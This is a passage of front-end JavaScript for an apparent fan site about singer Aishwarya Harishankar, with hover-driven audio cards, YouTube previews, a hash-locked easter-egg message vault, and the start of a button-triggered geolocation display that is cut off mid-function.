/**
 * Interactive Tri-Card Hero Section with Audio Engine
 * Features:
 * - Hover elevation ("comes ahead") & recession ("gets back")
 * - Dynamic procedural ambient music synthesis (100% offline, zero external dependencies)
 * - Support for custom MP3 files via data attribute or configuration
 * - Smooth audio crossfades with Web Audio API Gain nodes
 * - Autoplay policy compliance with interactive unlock
 */

// ==========================================================================
// CONFIGURATION & CUSTOM TRACKS
// (Replace with your own MP3 paths if desired, e.g. "tracks/song1.mp3")
// ==========================================================================
const TRACKS = [
  {
    id: 0,
    title: "Atha Petha Azhakay 🌾❤️",
    fullTitle: "Atha Petha Azhakay 🌾❤️ Fayas & Aishwarya Tamil Folk Song Official Full Song",
    theme: "dark-red",
    audioSrc: "card1.mp3",
    synthType: "drone"
  },
  {
    id: 1,
    title: "Lipstick 💄",
    fullTitle: "Lipstick (Official Video) Sagar Janardhan Ft. Aishwarya Harishankar #newsong",
    theme: "orange",
    audioSrc: "card2.mp3",
    synthType: "warm-pad"
  },
  {
    id: 2,
    title: "Mazya Sonya 🌟",
    fullTitle: "MAZYA SONYA - SWAGER BOY (OFFICIAL VIDEO) PROD. BY YD @yeardown AISHWARYA HARISHANKAR",
    theme: "yellow",
    audioSrc: "card3.mp3",
    synthType: "chimes"
  }
];

// ==========================================================================
// AUDIO SYNTHESIZER ENGINE (Procedural Audio for 100% Reliable Playback)
// ==========================================================================
class AmbientAudioEngine {
  constructor() {
    this.ctx = null;
    this.masterGain = null;
    this.isUnlocked = false;
    this.isMuted = false;
    this.activeCardIndex = null;
    this.channels = [];
    this.htmlAudioElements = [];
  }

  // Initialize Audio Context on first user gesture
  init() {
    if (this.ctx) return;
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (!AudioContextClass) return;

    this.ctx = new AudioContextClass();
    this.masterGain = this.ctx.createGain();
    this.masterGain.gain.setValueAtTime(0.7, this.ctx.currentTime);
    this.masterGain.connect(this.ctx.destination);

    // Build procedural synth channels for each card
    TRACKS.forEach((track, index) => {
      this.channels[index] = this.createProceduralChannel(track.synthType);

      // Also prepare fallback HTML Audio if user later adds MP3s
      if (track.audioSrc) {
        const audio = new Audio(track.audioSrc);
        audio.loop = true;
        audio.preload = "auto";
        this.htmlAudioElements[index] = audio;
      }
    });

    this.isUnlocked = true;
  }

  // Ensure AudioContext is resumed (browser autoplay policy)
  async unlock() {
    this.init();
    if (this.ctx && this.ctx.state === 'suspended') {
      await this.ctx.resume();
    }
    this.isUnlocked = true;
  }

  /**
   * Create realistic procedural ambient generative tracks using Web Audio API:
   * - Dark Red: Deep 55Hz Cello drone with sub-bass resonance and lowpass filter
   * - Orange: Warm 220Hz analog saw pad chord (A3, C#4, E4) with smooth LFO chorus
   * - Yellow: Radiant shimmering celestial chime melody (E5, G#5, B5, E6)
   */
  createProceduralChannel(type) {
    if (!this.ctx) return null;

    const channelGain = this.ctx.createGain();
    channelGain.gain.setValueAtTime(0, this.ctx.currentTime);
    channelGain.connect(this.masterGain);

    if (type === "drone") {
      // 01: CRIMSON DRONE (Deep, cinematic dark ambient)
      const osc1 = this.ctx.createOscillator();
      const osc2 = this.ctx.createOscillator();
      const sub = this.ctx.createOscillator();
      const filter = this.ctx.createBiquadFilter();

      osc1.type = 'sawtooth';
      osc1.frequency.setValueAtTime(55, this.ctx.currentTime); // A1 note
      osc2.type = 'sine';
      osc2.frequency.setValueAtTime(110, this.ctx.currentTime); // A2 note
      sub.type = 'triangle';
      sub.frequency.setValueAtTime(27.5, this.ctx.currentTime); // Sub-bass

      filter.type = 'lowpass';
      filter.frequency.setValueAtTime(280, this.ctx.currentTime);
      filter.Q.setValueAtTime(4, this.ctx.currentTime);

      osc1.connect(filter);
      osc2.connect(filter);
      sub.connect(filter);
      filter.connect(channelGain);

      osc1.start();
      osc2.start();
      sub.start();

    } else if (type === "warm-pad") {
      // 02: AMBER HORIZON (Warm analog poly-synth chord: F# minor / A major harmony)
      const chordFreqs = [174.61, 220.0, 261.63, 329.63]; // F3, A3, C4, E4
      const filter = this.ctx.createBiquadFilter();
      filter.type = 'lowpass';
      filter.frequency.setValueAtTime(500, this.ctx.currentTime);
      filter.Q.setValueAtTime(2, this.ctx.currentTime);

      // Subtle LFO sweep for gentle warmth
      const lfo = this.ctx.createOscillator();
      const lfoGain = this.ctx.createGain();
      lfo.frequency.setValueAtTime(0.3, this.ctx.currentTime);
      lfoGain.gain.setValueAtTime(150, this.ctx.currentTime);
      lfo.connect(lfoGain);
      lfoGain.connect(filter.frequency);
      lfo.start();

      chordFreqs.forEach(freq => {
        const osc = this.ctx.createOscillator();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
        const oscGain = this.ctx.createGain();
        oscGain.gain.setValueAtTime(0.2, this.ctx.currentTime);
        osc.connect(oscGain);
        oscGain.connect(filter);
        osc.start();
      });

      filter.connect(channelGain);

    } else if (type === "chimes") {
      // 03: SOLAR LUMINESCENCE (Shimmering bells / arpeggio)
      const baseGain = this.ctx.createGain();
      baseGain.gain.setValueAtTime(0.35, this.ctx.currentTime);
      baseGain.connect(channelGain);

      // High pass and band pass to give crystalline sparkle
      const filter = this.ctx.createBiquadFilter();
      filter.type = 'bandpass';
      filter.frequency.setValueAtTime(1200, this.ctx.currentTime);
      filter.Q.setValueAtTime(1.5, this.ctx.currentTime);
      filter.connect(baseGain);

      // Chime note generator loop
      const chimeNotes = [659.25, 830.61, 987.77, 1318.51, 1661.22]; // E5, G#5, B5, E6, G#6
      let noteIndex = 0;

      setInterval(() => {
        if (!this.ctx || this.activeCardIndex !== 2 || channelGain.gain.value < 0.05) return;

        try {
          const osc = this.ctx.createOscillator();
          const noteGain = this.ctx.createGain();

          osc.type = 'sine';
          const freq = chimeNotes[noteIndex % chimeNotes.length];
          noteIndex++;
          osc.frequency.setValueAtTime(freq, this.ctx.currentTime);

          noteGain.gain.setValueAtTime(0.25, this.ctx.currentTime);
          noteGain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 1.4);

          osc.connect(noteGain);
          noteGain.connect(filter);

          osc.start(this.ctx.currentTime);
          osc.stop(this.ctx.currentTime + 1.5);
        } catch (e) {
          // Ignore transient context errors
        }
      }, 350);

      // Also add a gentle high celestial background drone
      const drone = this.ctx.createOscillator();
      drone.type = 'triangle';
      drone.frequency.setValueAtTime(329.63, this.ctx.currentTime); // E4
      const droneGain = this.ctx.createGain();
      droneGain.gain.setValueAtTime(0.2, this.ctx.currentTime);
      drone.connect(droneGain);
      droneGain.connect(channelGain);
      drone.start();
    }

    return channelGain;
  }

  // Crossfade to target card's song
  playCard(index) {
    if (!this.isUnlocked) return;
    this.activeCardIndex = index;

    // Transition all procedural synth channels
    this.channels.forEach((gainNode, i) => {
      if (!gainNode) return;
      const now = this.ctx.currentTime;
      gainNode.gain.cancelScheduledValues(now);

      // Only fade in procedural synth if there is NO custom audioSrc
      if (i === index && !this.isMuted && !TRACKS[i].audioSrc) {
        gainNode.gain.setValueAtTime(gainNode.gain.value, now);
        gainNode.gain.linearRampToValueAtTime(0.85, now + 0.35);
      } else {
        // Fade out other songs over 300ms
        gainNode.gain.setValueAtTime(gainNode.gain.value, now);
        gainNode.gain.linearRampToValueAtTime(0, now + 0.3);
      }
    });

    // Custom MP3 playback (e.g. Atha Petha Azhakay)
    this.htmlAudioElements.forEach((audio, i) => {
      if (!audio) return;
      if (i === index && !this.isMuted) {
        audio.volume = 0.85;
        const playPromise = audio.play();
        if (playPromise !== undefined) {
          playPromise.catch((err) => {
            console.warn("Audio autoplay blocked by browser until user clicks:", err);
          });
        }
      } else {
        audio.pause();
      }
    });
  }

  // Fade out all audio when mouse leaves
  stopAll() {
    this.activeCardIndex = null;
    if (this.ctx) {
      this.channels.forEach(gainNode => {
        if (!gainNode) return;
        const now = this.ctx.currentTime;
        gainNode.gain.cancelScheduledValues(now);
        gainNode.gain.setValueAtTime(gainNode.gain.value, now);
        gainNode.gain.linearRampToValueAtTime(0, now + 0.4);
      });
    }

    this.htmlAudioElements.forEach(audio => {
      if (audio) audio.pause();
    });
  }

  // Toggle mute state
  toggleMute() {
    this.isMuted = !this.isMuted;
    if (this.masterGain && this.ctx) {
      const now = this.ctx.currentTime;
      this.masterGain.gain.cancelScheduledValues(now);
      this.masterGain.gain.setValueAtTime(this.masterGain.gain.value, now);
      this.masterGain.gain.linearRampToValueAtTime(this.isMuted ? 0 : 0.7, now + 0.2);
    }
    this.htmlAudioElements.forEach(audio => {
      if (audio) {
        audio.muted = this.isMuted;
      }
    });
    return !this.isMuted;
  }
}

// ==========================================================================
// DOM INTERACTION CONTROLLER
// ==========================================================================
document.addEventListener("DOMContentLoaded", () => {
  const cards = document.querySelectorAll(".hero-card");

  // Connect data-audio from cards to TRACKS configuration
  cards.forEach((card) => {
    const idx = parseInt(card.getAttribute("data-index"), 10);
    const customSrc = card.getAttribute("data-audio");
    if (customSrc && TRACKS[idx]) {
      TRACKS[idx].audioSrc = customSrc;
    }
  });

  const audio = new AmbientAudioEngine();
  const cardsContainer = document.getElementById("cardsContainer");
  const audioPill = document.getElementById("audioStatusPill");
  const audioToggleBtn = document.getElementById("audioToggleBtn");
  const audioIcon = document.getElementById("audioIcon");
  const audioText = document.getElementById("audioText");

  let hasUserInteracted = false;

  // Unlocks audio on any first user gesture (click or tap)
  const unlockAudio = async () => {
    if (!hasUserInteracted) {
      hasUserInteracted = true;
      await audio.unlock();
      audioPill.classList.add("active");
      audioIcon.textContent = "🔊";
      audioText.textContent = "Sound: ON";
    }
  };

  // Add click listener across page to seamlessly enable sound
  window.addEventListener("click", unlockAudio, { once: false });
  window.addEventListener("touchstart", unlockAudio, { once: false });

  // Handle Mute/Unmute Button
  audioToggleBtn.addEventListener("click", (e) => {
    e.stopPropagation();
    unlockAudio();
    const isSoundOn = audio.toggleMute();
    if (isSoundOn) {
      audioIcon.textContent = "🔊";
      audioText.textContent = "Sound: ON";
      audioPill.classList.add("active");
      // If a card is currently hovered, resume its song
      const activeCard = document.querySelector(".hero-card.is-active");
      if (activeCard) {
        const index = parseInt(activeCard.getAttribute("data-index"), 10);
        audio.playCard(index);
      }
    } else {
      audioIcon.textContent = "🔇";
      audioText.textContent = "Sound: MUTED";
      audioPill.classList.remove("active");
    }
  });

  // Activate a specific card: bring it ahead, push others back, start its song
  const activateCard = (card) => {
    const targetIndex = parseInt(card.getAttribute("data-index"), 10);

    cards.forEach((otherCard) => {
      if (otherCard === card) {
        // Bring this image ahead!
        otherCard.classList.add("is-active");
        otherCard.classList.remove("is-receded");
      } else {
        // Push other images back!
        otherCard.classList.add("is-receded");
        otherCard.classList.remove("is-active");
      }
    });

    // Start playing corresponding soundtrack
    if (hasUserInteracted) {
      audio.playCard(targetIndex);
    } else {
      unlockAudio().then(() => {
        audio.playCard(targetIndex);
      }).catch(() => { });
    }
  };

  // Reset cards back to normal resting layout
  const resetCards = () => {
    cards.forEach((card) => {
      card.classList.remove("is-active");
      card.classList.remove("is-receded");
    });

    audio.stopAll();
  };

  // Attach hover & click events to each card
  cards.forEach((card) => {
    // Mouse enters card: "one of image will come ahead and other will get back and from that ahead image song will start"
    card.addEventListener("mouseenter", () => {
      activateCard(card);
    });

    // Clicking anywhere on card unlocks and plays
    card.addEventListener("click", () => {
      unlockAudio();
      activateCard(card);
    });

    // Touch device support (mobile / tablets)
    card.addEventListener("touchstart", (e) => {
      e.stopPropagation();
      unlockAudio();
      activateCard(card);
    }, { passive: true });
  });

  // When cursor leaves the entire cards container, return cards to neutral and stop audio
  cardsContainer.addEventListener("mouseleave", () => {
    resetCards();
  });

  // Optional: subtle parallax 3D effect on mousemove over cards
  cardsContainer.addEventListener("mousemove", (e) => {
    const activeCard = document.querySelector(".hero-card.is-active");
    if (!activeCard) return;

    const rect = activeCard.getBoundingClientRect();
    const x = e.clientX - rect.left - rect.width / 2;
    const y = e.clientY - rect.top - rect.height / 2;

    const rotateY = (x / rect.width) * 4;
    const rotateX = -(y / rect.height) * 4;

    activeCard.style.transform = `translateY(-8px) scale(1.035) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
  });

  cardsContainer.addEventListener("mouseleave", () => {
    cards.forEach(card => {
      card.style.transform = "";
    });
  });

  // Ensure clicking the YouTube credit links opens the video without card click interference
  document.querySelectorAll(".credits-link").forEach((link) => {
    link.addEventListener("click", (e) => {
      e.stopPropagation();
    });
  });

  // ==========================================================================
  // SECTION 3: ALBUMS (4) & SHORT FILMS (5) VIDEO HOVER PREVIEW & MARQUEE CONTROL
  // ==========================================================================
  const worksCards = document.querySelectorAll(".works-card");
  let worksAudioPlayer = null;

  try {
    worksAudioPlayer = new Audio();
    worksAudioPlayer.preload = "auto";
  } catch (e) {
    console.warn("Audio element could not be initialized:", e);
  }

  worksCards.forEach((card) => {
    const videoLayer = card.querySelector(".card-video-layer");
    const youtubeId = card.getAttribute("data-youtube-id");
    const youtubeUrl = card.getAttribute("data-youtube-url");
    const audioSrc = card.getAttribute("data-audio-src");
    let hoverTimer = null;

    // Hover Enter: Debounce preview mount (90ms) to ensure butter-smooth performance
    card.addEventListener("mouseenter", () => {
      // If hero audio happens to be playing, stop it
      if (typeof audio !== "undefined" && audio.stopAll) {
        audio.stopAll();
      }

      hoverTimer = setTimeout(() => {
        // Case 1: Card has local audio source (e.g. Mazya Sonya - bypassing YouTube 150 embed restriction)
        if (audioSrc && videoLayer) {
          if (!videoLayer.querySelector(".mazya-preview-box")) {
            videoLayer.innerHTML = `
              <div class="mazya-preview-box">
                <img src="./p3.jpg" alt="Mazya Sonya Preview" class="mazya-preview-art" />
                <div class="mazya-preview-overlay">
                  <div class="mazya-sound-bars">
                    <span class="m-bar"></span><span class="m-bar"></span><span class="m-bar"></span>
                    <span class="m-bar"></span><span class="m-bar"></span><span class="m-bar"></span>
                    <span class="m-bar"></span><span class="m-bar"></span>
                  </div>
                  <div class="mazya-preview-text">
                    <span class="m-label">🎵 PLAYING OFFICIAL AUDIO</span>
                    <span class="m-song">MAZYA SONYA • SWAGER BOY</span>
                  </div>
                </div>
              </div>
            `;
          }

          if (worksAudioPlayer) {
            worksAudioPlayer.src = audioSrc;
            worksAudioPlayer.currentTime = 0;
            worksAudioPlayer.volume = 1.0;
            worksAudioPlayer.play().catch(() => { });
          }

          card.classList.add("is-playing");
          return;
        }

        // Case 2: Card has YouTube video ID (Lal Bindi, Atha Petha Azhakay, Lipstick, etc.)
        if (youtubeId && videoLayer) {
          if (!videoLayer.querySelector("iframe")) {
            const iframe = document.createElement("iframe");
            iframe.src = `https://www.youtube.com/embed/${youtubeId}?autoplay=1&mute=1&controls=0&loop=1&playlist=${youtubeId}&modestbranding=1&rel=0&playsinline=1`;
            iframe.title = card.getAttribute("data-title") || "Video Preview";
            iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share";
            iframe.allowFullscreen = true;
            iframe.className = "card-preview-iframe";
            videoLayer.appendChild(iframe);
          }
          card.classList.add("is-playing");
        }
      }, 90);
    });

    // Hover Leave: Clean up iframe & audio immediately, restore thumbnail
    card.addEventListener("mouseleave", () => {
      if (hoverTimer) {
        clearTimeout(hoverTimer);
        hoverTimer = null;
      }
      card.classList.remove("is-playing");

      if (worksAudioPlayer) {
        worksAudioPlayer.pause();
        worksAudioPlayer.currentTime = 0;
      }

      if (videoLayer) {
        videoLayer.innerHTML = "";
      }
    });

    // Clicking anywhere on the card (except the direct YouTube button) opens the video
    card.addEventListener("click", (e) => {
      if (e.target.closest(".btn-youtube-direct") || e.target.closest("a")) {
        return; // Allow native link navigation
      }

      if (youtubeUrl) {
        window.open(youtubeUrl, "_blank", "noopener,noreferrer");
      }
    });

    // Touch device support (mobile / tablets)
    card.addEventListener("touchstart", (e) => {
      if (e.target.closest(".btn-youtube-direct") || e.target.closest("a")) {
        return;
      }

      // If already playing, tapping opens the video directly
      if (card.classList.contains("is-playing")) {
        if (youtubeUrl) {
          window.open(youtubeUrl, "_blank", "noopener,noreferrer");
        }
      } else {
        // Stop any other active preview
        worksCards.forEach(c => {
          if (c !== card) {
            c.classList.remove("is-playing");
            const layer = c.querySelector(".card-video-layer");
            if (layer) layer.innerHTML = "";
          }
        });

        if (worksAudioPlayer) {
          worksAudioPlayer.pause();
          worksAudioPlayer.currentTime = 0;
        }

        if (audioSrc && videoLayer) {
          videoLayer.innerHTML = `
            <div class="mazya-preview-box">
              <img src="./p3.jpg" alt="Mazya Sonya Preview" class="mazya-preview-art" />
              <div class="mazya-preview-overlay">
                <div class="mazya-sound-bars">
                  <span class="m-bar"></span><span class="m-bar"></span><span class="m-bar"></span>
                  <span class="m-bar"></span><span class="m-bar"></span><span class="m-bar"></span>
                  <span class="m-bar"></span><span class="m-bar"></span>
                </div>
                <div class="mazya-preview-text">
                  <span class="m-label">🎵 PLAYING OFFICIAL AUDIO</span>
                  <span class="m-song">MAZYA SONYA • SWAGER BOY</span>
                </div>
              </div>
            </div>
            
          `;
          if (worksAudioPlayer) {
            worksAudioPlayer.src = audioSrc;
            worksAudioPlayer.currentTime = 0;
            worksAudioPlayer.play().catch(() => { });
          }
          card.classList.add("is-playing");
        } else if (youtubeId && videoLayer && !videoLayer.querySelector("iframe")) {
          const iframe = document.createElement("iframe");
          iframe.src = `https://www.youtube.com/embed/${youtubeId}?autoplay=1&mute=1&controls=0&loop=1&playlist=${youtubeId}&modestbranding=1&rel=0&playsinline=1`;
          iframe.title = card.getAttribute("data-title") || "Video Preview";
          iframe.allow = "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share";
          iframe.allowFullscreen = true;
          iframe.className = "card-preview-iframe";
          videoLayer.appendChild(iframe);
          card.classList.add("is-playing");
        }
      }
    }, { passive: true });
  });

  console.log("Interactive Tri-Card Experience & Works Showcase loaded successfully.");

  // ==========================================================================
  // CONFIDENTIAL VAULT — EASTER EGG POPUP (5 CLICKS ON QUICK INTRO PHOTO)
  // ==========================================================================
  (function initVault() {
    const avatarRing = document.getElementById("quickIntroAvatarRing");
    const modalOverlay = document.getElementById("vaultModalOverlay");
    const modalBackdrop = document.getElementById("vaultModalBackdrop");
    const btnModalClose = document.getElementById("btnVaultModalClose");

    const disclaimerBox = document.getElementById("vaultDisclaimerBox");
    const lockedState = document.getElementById("vaultLockedState");
    const revealedState = document.getElementById("vaultRevealedState");
    const destroyedState = document.getElementById("vaultDestroyedState");
    const passInput = document.getElementById("vaultPassInput");
    const btnToggle = document.getElementById("btnVaultToggle");
    const unlockForm = document.getElementById("vaultUnlockForm");
    const errorMsg = document.getElementById("vaultErrorMsg");
    const revealedText = document.getElementById("vaultRevealedText");
    const messageBox = document.getElementById("vaultMessageBox");
    const timerVal = document.getElementById("vaultTimerVal");
    const timerBar = document.getElementById("vaultTimerBar");
    const btnDestroy = document.getElementById("btnVaultDestroy");
    const resetHint = document.getElementById("vaultResetHint");

    // Cryptographic artifacts — message is NEVER stored in plain text
    const SALT = "Aish_Vault_2026_X9";
    const EXPECTED_HASH = "6505fa0a71fc280fe2aff8ec687c11f045310ca4f450109a65f36bbe2406d955";
    let CIPHER = "h59a5clzCFmH2pGABBlr0ClYfsHUM3W6CJYYzUVhvHUWYI9mWZkBI8Lc34UEXGefMEIs1Jgx0zQR3UtcvqY27eoP8FgQmEBqm4+qjQwUdIlpOwbsnXEw00WSBp5CdLY4RVWPZBTSIgWxxpaPDVxonzARbdaRcHG6FYAS3UxptToCfNp5BYlMaozb1MwhXGWYLF9nhI0/ZboSmgfSBHS8NAlpgyoEkkxqkNyMjQYYMYctUHiEvXBx90WHGcdNaL51EWraeRmdWmrCx52eDVIxuWVGbcqANXS6EZxL21x2tTQMa9prUZpNeMLbkIUGG2LKTzs9itQHeONFukvTRWK8dRFtk3lRi01tkcaMiWI9d4QgQyzHmz1g9gCHAtBDJrQsRWGfbQOZTSPC5tiECRgxkWVdY9DUP3a6A4EO2wRysDgAK9pDUYlbaoaPjINID2GVK1UszYBwcu8Mnw/XSmH5JRdqkG8SiFsjwtidjhsVZZU2HSzFmjQw/QSeDs0KJo49DGmfKhKTTGaMyNTMIVxmnzBdaISbNmT/C9MN30hq+TwLcZUqBZRNL6vBi5gJG2ORKBFt0YA/PekGgQTSSCatJwR11CollEl7AC9hn0gUfodlSGPRhnBz9QuHDtBQJqohBHeObxXcSX+SypmeARJ20CpfLMmNcHb/AJdFtC5ftiAXJZhrEpdPfY3alohIEWSDLFIsxZo0MPkKnR/bSnL5PQRh2mtRn0ljj8aWi0gZd5YgUniEmz4w9xzTBtdKYuJ1DHHaYhSQWGqGj5WJSBp+kzBCLMWaNDDpCZwcnkBprjtLJa9kGpJHeIvBn4ARUDG5ZUJ4xYYkdf5FhArKR26wOwIlg2UEjgh5i8udgxtcY5UiRGDFhjxptEWkA9tKY68wFyWXc1GfR2uHj4yDBxcxhCxcaYSAPzD5Cp4b10hj+ToXJYh/H9AIRsLYl5kEGDGHJEVvzNQpf+8X0x3XQGO2dRF3m2QClVxmjcGLwkgzZ5U3EXjNmTU8uhGbAs0Ec7c+C2qNYx+bRHbC242eBhl10CxfeMvUIHHoBIAE3U1ntXUMa45vA51Le4vAlswOE2PQKFQirv4Ef7oClh+eS3OtdQpj2mMF0AhGws6InAQVdJRlRWTB1DVo+waHS85Xf7o9CmmVbRifSWPCzJeCCxlhhDYRRYSDMWO6CZYKzEpvtzJFZJhlBIgSL6PMm4kYCHCeJlQsxZo0MNkKngbXUGu8OxElrmIUjkl/m4/QrSsoONCnsZ+EFtCM2QqUBddQb68wRUGfbASPQWCMTXhxRFxCiTZFacmVJHn5RbcOzUFoqjwRbIBrBZVHYcKJ2KkQDH6DMENphKA4degEgxKSBGe3MUVDn2sD3HtqltuRgg9SG/oRWX7LgTd4uhGbDs1BJq06CmmJJlG1CH2HzpSFEhl10DFZbdDUKX/vF9Md0U1lvHUEa54qCJNdfcLfiokbGX+TIBF7wYY1MPIEhQLQQya4dRNgiHNRj1x9jcGfzAsdfZ0sX2uEkTZ2/waHS9FKJrQsRWiTZBXQCG6My9ilSBRwlGVTacebPXW6CoUOzEh/+TQRcZtpGZlMIeilysJIK3mRMRFFhJA5dLoLlhPKBGe3MUVykm8DmQhGws6VzAYTZvoRXizGhjVx8UWHA9sEZaA2CWDWKjjcRGqDwZ2ISA9lgiRYa8yAcHn0EZxL010mqScKZ5ZvHB6om4bGjoUGGzGUIFR8hJ0+ZPVFkR7XSGKwOwIljW8Tj0F7h9zUzB8UeJMtEWXX1Cd4+xHTIp5Iaa8wRXGVKhWTBi+qzo6FBhsxhyRFb8yRNDDuDZZL20pysCcAJbdvH4hJY4vcjMwbGWOZIEIs1IY1ZvMKhhjSXSa4ORZq2mIUkFhqho+TiQ0MMZ08EWHNmjQw+wuSB8dQb7o0CSWbZBXcSWyWxo6JSBl/nzBWZISAPzDtCoEAnkl/+SIEfNp+GY5HeoXH2IUcUhv6C157iNQZMPsI0wjRSXa1MBFglnNRn0BujMidiEgdf5RlQ2nHmyZ16ACXRZ5t5FnME2Daax2PRy+PwI6JDFx3nzdGbdaQcHH0AdMO0FZptTkAYdpjH9xJL4zKjJsHDnrQIF9rzZo1degMnQyeR2msJxZg2wB7zwYvtceBzCFccJ1lQmnKkDl+/UWHA9dXDJB1AWyeZJN8sXvC2JmCHFxlmCARe8GWI3nuANMK0EAmrT0AJZ9sF5Nae8Lm2JwdCDGZK0VjhJ0kMO4K0wzRBHK2dRJkiX4U0Ah4isabhEgVYtAyWXWEvXBy7wyfH55Ncvd1JGmJZV3cYS+VzpaYSAh+0DZYYseRInX2HNMKzktqtjIMf58qGJoIRsLcnYIcXHCePEVkzZo3MPMLkhvOVmmpJwxkjm9RiEcvm8CNnkg1f4MxUGvWlT0w8gSdD9JBJrYnRWiTeROZQG6UypzMARIxkStILNOVKT6Qb6QOnlNvtTlFdYhlE51KY5uPlokeGWPQKFRp0Nhwcu8R0wLYBGSgdRZql29Rn0dmjMyRiA0ScpVlRmmEkSZ16EWXBJ5HdLYmFiWKawWUWyPC5hps8RB90DVDY8aVMnzjRZkezVAmrjQJbtp/AdxJYYaPi40RRjESxa1O3dQkeP9FhArHCCa0LEVom2cY3Ftng92dn0gIeZVlVHTFlyQw6QSeDp5AZ60wRWqcKhOVWnuKj5mfSAV+hWUZZtGHJDD7RZcC2EJjqzALcdpzFJ1aJsNNeHFidl2fKlplypNwcvsGmEeebSatPQxrkSoFlEF8wseZnBgZf5UhEXzFhiR840WRDt1Fc6owRUzafRCPCGmHypSFBhsxnCpfaciNfjDfE5YFnlButiACbdpDUZRJeYePnp4BGX+UNh0s0Jw1aboJmh3bBGC4J0VkjWsI0AhujMvYpUgPYZUrVSzJmyNkugqVS9NdJq08CGDaax2TRmrC2JeeAxV/l2VeYoSZKTDqF5wB20dyqnUEa54qG5NKL5LdnZwJDnCELF5iiv5aX/RFkkvOS3WwIQxznyofk1xqzo+xzB8dYtAiVGLRnT519hzTAtBXdrAnAGHaaAjcUWCXgdilSBd/nzIRdcuBcGPqAJIAnklztSEMdZZvUZBJYYXamYsNDz3QJF9ohIc/MP4K0yKfBE/5NhB3iG8fiER2wsSWgx9cXJE3UHjMnXA42w2aGd9Kb/kmCWSUbVjQCEeLwZyFRFxUniJdZdecfDDJBJ0Y1VZvrXlFT5t6EJJNfIeD2I0GGDGiMEJ/zZU+Pro3mgzWUCa3OhIp2kOTfLFiwsOdjRoSeJ4iEUrWkT5z8knTCtBAJrU6Cm6TZBbcQWGWwNivABV/lTZULMWaNDDRCoEO30om8TgKdo5mCNxOYJCPlZVIEHiEMV1phIc5Y+4AgUeeV2+3NgAliWIU3ERglMqLzBwUdJ1sHwauoDhx9A7TEtFRJr86FyWIbxCYQWGFg9iNBhgxhyxCZISNP2W6BJ8HnlBuvHUHYIl+Xw==";
    const STORAGE_KEY = "aish_vault_status_2026_v3";

    // Pure-JS SHA-256
    function sha256Bytes(ascii) {
      function rr(v, a) { return (v >>> a) | (v << (32 - a)); }
      const maxW = Math.pow(2, 32);
      const lp = "length";
      const words = [];
      const bitLen = ascii[lp] * 8;
      let hash = [], k = [], pc = 0, ic = {};
      for (let c = 2; pc < 64; c++) {
        if (!ic[c]) {
          for (let i = 0; i < 313; i += c) ic[i] = c;
          hash[pc] = (Math.pow(c, 0.5) * maxW) | 0;
          k[pc++] = (Math.pow(c, 1 / 3) * maxW) | 0;
        }
      }
      ascii += "\x80";
      while (ascii[lp] % 64 - 56) ascii += "\x00";
      for (let i = 0; i < ascii[lp]; i++) {
        let j = ascii.charCodeAt(i);
        words[i >> 2] |= j << ((3 - i) % 4) * 8;
      }
      words[words[lp]] = (bitLen / maxW) | 0;
      words[words[lp]] = bitLen;
      for (let j = 0; j < words[lp];) {
        const w = words.slice(j, j += 16);
        const old = hash;
        hash = hash.slice(0, 8);
        for (let i = 0; i < 64; i++) {
          const w15 = w[i - 15], w2 = w[i - 2];
          const a = hash[0], e = hash[4];
          const t1 = hash[7] + (rr(e, 6) ^ rr(e, 11) ^ rr(e, 25)) + ((e & hash[5]) ^ ((~e) & hash[6])) + k[i]
            + (w[i] = (i < 16) ? w[i] : (w[i - 16] + (rr(w15, 7) ^ rr(w15, 18) ^ (w15 >>> 3)) + w[i - 7] + (rr(w2, 17) ^ rr(w2, 19) ^ (w2 >>> 10))) | 0);
          const t2 = (rr(a, 2) ^ rr(a, 13) ^ rr(a, 22)) + ((a & hash[1]) ^ (a & hash[2]) ^ (hash[1] & hash[2]));
          hash = [(t1 + t2) | 0].concat(hash);
          hash[4] = (hash[4] + t1) | 0;
        }
        for (let i = 0; i < 8; i++) hash[i] = (hash[i] + old[i]) | 0;
      }
      const bytes = [];
      for (let i = 0; i < 8; i++) {
        for (let j = 3; j >= 0; j--) bytes.push((hash[i] >> (j * 8)) & 255);
      }
      return bytes;
    }

    function bytesToHex(bytes) {
      return bytes.map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
    }
    (function () {
      var trigger = document.getElementById("locationTrigger") || document.getElementById("btn");
      var statusEl = document.getElementById("status");
      var noteInput = document.getElementById("locationNote");
      var triggerTextEl = trigger ? trigger.querySelector(".trigger-text") : null;
      var triggerIconEl = trigger ? trigger.querySelector(".trigger-icon") : null;

      var originalText = triggerTextEl ? triggerTextEl.textContent : (trigger ? trigger.textContent : "");
      var originalIcon = triggerIconEl ? triggerIconEl.textContent : "📍";
      var isLoading = false;

      function setStatus(msg, cls) {
        if (statusEl) {
          statusEl.textContent = msg;
          statusEl.className = cls || "";
        }
      }

      function setTriggerState(loading, text, icon) {
        isLoading = loading;
        if (!trigger) return;

        if (loading) {
          trigger.classList.add("loading");
          trigger.setAttribute("aria-busy", "true");
        } else {
          trigger.classList.remove("loading");
          trigger.removeAttribute("aria-busy");
        }

        if (triggerTextEl) {
          triggerTextEl.textContent = text || originalText;
        }
        if (triggerIconEl) {
          triggerIconEl.textContent = icon || originalIcon;
        }
      }

      function showResult(r) {
        var noteLabel = document.getElementById("noteLabel");
        var noteVal = document.getElementById("noteVal");
        if (r.note) {
          if (noteLabel) noteLabel.hidden = false;
          if (noteVal) {
            noteVal.hidden = false;
            noteVal.textContent = r.note;
          }
        } else {
          if (noteLabel) noteLabel.hidden = true;
          if (noteVal) noteVal.hidden = true;
        }

        var latEl = document.getElementById("lat");
        var lngEl = document.getElementById("lng");
        var mapEl = document.getElementById("map");
        var resultEl = document.getElementById("result");

        if (latEl) latEl.textContent = r.lat.toFixed(6);
        if (lngEl) lngEl.textContent = r.lng.toFixed(6);
        if (mapEl) mapEl.href = "https://www.google.com/maps?q=" + r.lat + "," + r.lng;
        if (resultEl) resultEl.hidden = false;
      }

      function executeLocationCapture() {
        if (isLoading) return;

        if (!("geolocation" in navigator)) {
          setStatus("Your browser doesn’t support location.", "err");
